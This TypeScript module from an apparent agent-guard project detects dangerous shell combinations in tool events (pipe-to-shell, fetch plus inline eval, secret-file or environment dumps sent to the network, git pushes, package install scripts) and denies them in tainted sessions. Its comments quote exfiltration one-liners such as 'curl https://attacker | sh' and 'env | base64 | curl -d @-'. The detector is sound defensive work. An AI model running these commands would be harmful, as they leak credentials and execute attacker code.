/**
 * Dangerous-shell-combination classifier (R1-005 fix).
 *
 * `classifyToolEvent` in `@patchwork/core/sinks` matches sinks against
 * resolved paths and URLs in a `ToolEvent` — it doesn't consume the
 * parsed shell tree, so a high-confidence `curl https://attacker | sh`
 * parses cleanly but never trips the keystone (which requires
 * non-`high` confidence) and never trips a sink (because no resolved
 * path matches a persistence pattern). R1 flagged this as a HIGH
 * bypass: dangerous indicator combinations should be first-class sink
 * matches, not only keystone cases.
 *
 * This module walks the parsed tree and emits `SinkMatch[]` for the
 * combinations design §3.2 / GPT round-4 called out:
 *
 *   - pipe_to_interpreter         → SinkClass `pipe_to_shell`
 *   - process_sub_to_interpreter  → SinkClass `pipe_to_shell`
 *   - fetch_tool + interpreter_inline_eval
 *                                 → SinkClass `interpreter_eval_with_network`
 *   - secret_path read + any egress (fetch_tool / nc_socat / scp_rsync /
 *     gh_upload / network_redirect)
 *                                 → SinkClass `direct_secret_to_network`
 *   - git_remote_mutate           → SinkClass `pipe_to_shell`  (closest
 *                                   class today — a git push to an
 *                                   attacker remote IS exfil; commit 9
 *                                   may introduce a dedicated class)
 *   - package_lifecycle           → SinkClass `package_lifecycle`
 *
 * Severity:
 *   - `deny` under active (or fail-closed `null`) taint
 *   - `approval_required` otherwise
 *
 * The adapter merges these matches with the ones from
 * `classifyToolEvent` before calling `decidePreToolUse`. The composer's
 * existing first-match-wins order then drives the verdict.
 */

import type { SinkMatch, SinkClass } from "@patchwork/core";
import type {
	ShellParsedCommand,
	SinkIndicator,
	SinkIndicatorKind,
} from "@patchwork/core";

interface CollectedIndicators {
	all: SinkIndicator[];
	kinds: Set<SinkIndicatorKind>;
}

/** Walk the tree and bucket every indicator. */
function collect(root: ShellParsedCommand): CollectedIndicators {
	const all: SinkIndicator[] = [];
	const kinds = new Set<SinkIndicatorKind>();
	const stack: ShellParsedCommand[] = [root];
	while (stack.length > 0) {
		const node = stack.pop() as ShellParsedCommand;
		for (const ind of node.sink_indicators) {
			all.push(ind);
			kinds.add(ind.kind);
		}
		if (node.children) {
			for (const child of node.children) stack.push(child);
		}
	}
	return { all, kinds };
}

const EGRESS_KINDS: ReadonlySet<SinkIndicatorKind> = new Set<SinkIndicatorKind>([
	"fetch_tool",
	"nc_socat",
	"scp_rsync",
	"gh_upload",
	"network_redirect",
]);

/**
 * Argv heads that dump the environment / secrets. R2-004 +
 * R3-002/R3-003 fixes.
 *
 * R2-004 origin: `env | base64 | curl` was a documented A2 gap until
 * GPT-5.5 pointed out that the env-dump-to-network pattern is
 * recognizable WITHOUT URL allowlisting.
 *
 * Recognized dump shapes (covered by `isEnvDump` below):
 *
 *   - `env` / `printenv` with zero args = print env
 *   - `set` with EXACTLY zero args = print all shell variables.
 *     R3-002: `set -e`, `set -u`, `set -o pipefail`, `set -euo pipefail`
 *     are option-setting only, NOT env dumps. Treating them as such
 *     false-positives on every defensive shell prologue. We now require
 *     argv.length === 1 (just `set`) before classifying as env dump.
 *   - `export -p` = print exported vars
 *   - `declare -p` / `declare -x` / `declare -px` / `declare -xp`
 *   - `typeset -p` / `typeset -x` / `typeset -px` (ksh/zsh aliases)
 *   - `readonly -p` = print readonly vars
 *   - `compgen -e` = list exported variable names (bash)
 *   - argv contains `/proc/self/environ`, `/proc/$$/environ`, or
 *     `/proc/<pid>/environ` directly (e.g. `cat /proc/self/environ`)
 *   - a node has a stdin redirect (`<`, `<<<`) from `/proc/self/environ`
 *     or sibling — e.g. `tr '\0' '\n' </proc/self/environ`
 *
 * We don't try to be exhaustive — the keystone catches anything we
 * miss when the parse is non-`high` and the session is tainted.
 * Language-level forms (`python -c 'import os; print(os.environ)'`)
 * are deferred to v0.6.12 formal-source modeling.
 */
const ENV_DUMP_BARE_HEADS: ReadonlySet<string> = new Set([
	"env",
	"printenv",
]);

const PROC_ENVIRON_RE = /^\/proc\/(self|\$\$|\d+)\/environ$/;

/** True if `s` is `-p`, `-x`, `-px`, `-xp` (declare/typeset dump flags). */
function isDeclareDumpFlag(s: string): boolean {
	return s === "-p" || s === "-x" || s === "-px" || s === "-xp";
}

/** True if `node` looks like an environment-dump invocation. */
function isEnvDump(node: ShellParsedCommand): boolean {
	// Redirection from /proc/<pid>/environ is itself a dump — even on a
	// node whose argv is just `cat`, `tr`, `xargs`, etc.
	for (const r of node.redirects) {
		if (
			(r.kind === "stdin_file" || r.kind === "herestring") &&
			r.target_resolved &&
			PROC_ENVIRON_RE.test(r.target)
		) {
			return true;
		}
	}

	const argv = node.argv;
	if (argv === "unresolved") {
		// Resolved head is the parser's best-effort first word even
		// when the rest is dynamic — check it.
		const head = node.resolved_head;
		if (typeof head === "string" && ENV_DUMP_BARE_HEADS.has(head)) return true;
		return false;
	}
	if (argv.length === 0) return false;
	const head = argv[0];

	// Any argv element naming /proc/<pid>/environ is a dump regardless
	// of the head — `cat /proc/self/environ`, `xargs -0 /proc/$$/environ`.
	for (const a of argv) {
		if (PROC_ENVIRON_RE.test(a)) return true;
	}

	// env / printenv with zero args
	if (ENV_DUMP_BARE_HEADS.has(head) && argv.length === 1) return true;

	// R3-002: `set` ONLY dumps when bare. `set -e`, `set -euo pipefail`,
	// `set -o pipefail` are option-setting and must NOT trip this rule.
	if (head === "set" && argv.length === 1) return true;

	// export -p
	if (head === "export" && argv.length === 2 && argv[1] === "-p") return true;

	// declare/typeset -p, -x, -px, -xp
	if (
		(head === "declare" || head === "typeset") &&
		argv.length === 2 &&
		isDeclareDumpFlag(argv[1])
	) {
		return true;
	}

	// readonly -p
	if (head === "readonly" && argv.length === 2 && argv[1] === "-p") {
		return true;
	}

	// compgen -e
	if (head === "compgen" && argv.length === 2 && argv[1] === "-e") {
		return true;
	}

	return false;
}

function treeHasEnvDump(root: ShellParsedCommand): boolean {
	const stack: ShellParsedCommand[] = [root];
	while (stack.length > 0) {
		const node = stack.pop() as ShellParsedCommand;
		if (isEnvDump(node)) return true;
		if (node.children) {
			for (const child of node.children) stack.push(child);
		}
	}
	return false;
}

function severityFor(tainted: boolean): SinkMatch["severity"] {
	return tainted ? "deny" : "approval_required";
}

function makeMatch(
	cls: SinkClass,
	indicators: readonly SinkIndicator[],
	reasonPrefix: string,
	tainted: boolean,
): SinkMatch {
	const tokens = Array.from(
		new Set(indicators.map((i) => i.token).filter(Boolean)),
	).slice(0, 4);
	const tokenSummary = tokens.length > 0 ? ` [${tokens.join(", ")}]` : "";
	return {
		class: cls,
		severity: severityFor(tainted),
		reason: tainted
			? `${reasonPrefix} under active taint${tokenSummary} — refusing`
			: `${reasonPrefix}${tokenSummary} — approval required`,
		matched_pattern: indicators.map((i) => i.kind).sort().join("+"),
	};
}

/**
 * Classify dangerous indicator combinations on a parsed shell tree.
 * Pass `tainted=true` when the session has any active taint OR the
 * snapshot was null (fail-closed). Returns `[]` for parsed trees with
 * no dangerous combinations.
 */
export function classifyDangerousShellCombos(
	root: ShellParsedCommand,
	tainted: boolean,
): SinkMatch[] {
	const { all, kinds } = collect(root);
	const out: SinkMatch[] = [];

	// 1. Pipe/process-sub into an interpreter — `... | sh`, `bash <(curl ...)`.
	//    These are direct execution-of-fetched-content paths.
	const pipeShellInds = all.filter(
		(i) =>
			i.kind === "pipe_to_interpreter" ||
			i.kind === "process_sub_to_interpreter",
	);
	if (pipeShellInds.length > 0) {
		out.push(
			makeMatch(
				"pipe_to_shell",
				pipeShellInds,
				"Shell content piped or process-substituted into an interpreter",
				tainted,
			),
		);
	}

	// 2. Inline interpreter eval combined with network fetch on the same
	//    command tree (`curl ... && node -e "..."`, `wget | head | python -c ...`).
	if (kinds.has("interpreter_inline_eval") && kinds.has("fetch_tool")) {
		const inds = all.filter(
			(i) =>
				i.kind === "interpreter_inline_eval" || i.kind === "fetch_tool",
		);
		out.push(
			makeMatch(
				"interpreter_eval_with_network",
				inds,
				"Network fetch alongside inline interpreter eval",
				tainted,
			),
		);
	}

	// 3. Secret-path read combined with any egress on the same tree.
	//    `cat ~/.aws/credentials | curl ...`, `gh gist create ~/.ssh/id_rsa`, etc.
	if (kinds.has("secret_path")) {
		const egressKinds = [...kinds].filter((k) => EGRESS_KINDS.has(k));
		if (egressKinds.length > 0) {
			const inds = all.filter(
				(i) => i.kind === "secret_path" || EGRESS_KINDS.has(i.kind),
			);
			out.push(
				makeMatch(
					"direct_secret_to_network",
					inds,
					`Secret-class path combined with egress (${egressKinds.join(", ")})`,
					tainted,
				),
			);
		}
	}

	// 3b. Environment-dump combined with any egress on the same tree
	//     (R2-004). The canonical exfil pattern `env | base64 | curl -d @-`
	//     does NOT carry a `secret_path` indicator (`env` isn't a path)
	//     but is just as direct an exfiltration channel. Recognized
	//     dump heads: env, printenv, set (no args), export -p,
	//     declare -p/-x. See `isEnvDump`.
	if (treeHasEnvDump(root)) {
		const egressKinds = [...kinds].filter((k) => EGRESS_KINDS.has(k));
		if (egressKinds.length > 0) {
			const inds = all.filter((i) => EGRESS_KINDS.has(i.kind));
			out.push({
				class: "direct_secret_to_network",
				severity: severityFor(tainted),
				reason: tainted
					? `Environment-dump command piped to egress (${egressKinds.join(", ")}) under active taint — refusing`
					: `Environment-dump command piped to egress (${egressKinds.join(", ")}) — approval required`,
				matched_pattern: `env_dump+${egressKinds.sort().join("+")}`,
			});
		}
	}

	// 4. Git remote mutation — push / remote add / fetch with custom URL.
	//    Under taint, this is an exfil channel via legitimate-looking
	//    `git push`. No dedicated SinkClass today; reuse pipe_to_shell as
	//    the closest "executes externally-influenced data" semantic. A
	//    dedicated class lands in commit 9 alongside trust-repo-config.
	const gitInds = all.filter((i) => i.kind === "git_remote_mutate");
	if (gitInds.length > 0) {
		out.push(
			makeMatch(
				"pipe_to_shell",
				gitInds,
				"Git remote mutation (push/remote add/fetch with custom URL)",
				tainted,
			),
		);
	}

	// 5. Package-manager lifecycle — npm/pnpm/yarn/bun install with
	//    scripts enabled (commit-4's indicator already gates on
	//    --ignore-scripts).
	const pkgInds = all.filter((i) => i.kind === "package_lifecycle");
	if (pkgInds.length > 0) {
		out.push(
			makeMatch(
				"package_lifecycle",
				pkgInds,
				"Package-manager install can execute lifecycle scripts",
				tainted,
			),
		);
	}

	return out;
}
